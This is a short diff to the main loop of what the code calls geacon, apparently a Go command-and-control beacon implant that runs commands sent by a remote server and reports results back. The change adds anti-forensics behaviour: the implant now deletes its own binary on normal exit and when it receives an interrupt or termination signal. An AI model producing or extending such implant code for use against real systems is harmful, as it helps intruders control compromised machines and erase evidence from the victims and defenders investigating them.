@@ -8,11 +8,23 @@ import (
 	"main/sysinfo"
 	"main/util"
 	"math/rand"
+	"os"
+	"os/signal"
+	"syscall"
 	"time"
 )
 
 func main() {
-	// set rand seed at beginning of the program
+	// delete self
+	defer command.DeleteSelf()
+	signalChan := make(chan os.Signal, 1)
+	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)
+	go func() {
+		<-signalChan
+		command.DeleteSelf()
+		os.Exit(0)
+	}()
+
 	currentTime := time.Now()
 	rand.Seed(currentTime.UnixNano())
 	command.TimeCheck(currentTime)
@@ -154,7 +166,6 @@ func main() {
 								execErr = command.GetNetworkInformation(cmdBuf)
 							case command.CMD_TYPE_EXIT:
 								packet.PushResult(packet.CALLBACK_DEAD, []byte("exit"))
-								command.DeleteSelf()
 								return
 							default:
 								errMsg := util.Sprintf("command type %d is not support by geacon now", cmdType)
